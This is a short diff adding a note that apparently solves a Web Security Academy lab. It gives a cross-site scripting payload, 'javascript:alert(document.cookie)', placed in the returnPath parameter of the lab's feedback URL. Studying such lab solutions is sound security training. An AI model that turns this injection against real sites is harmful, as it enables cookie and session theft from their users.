@@ -1,0 +1,7 @@
+Add Following Payload at the end of the url  
+
+javascript:alert(document.cookie)   
+
+https://0a9e00c40432e86d807780ba00c90060.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)   
+
+
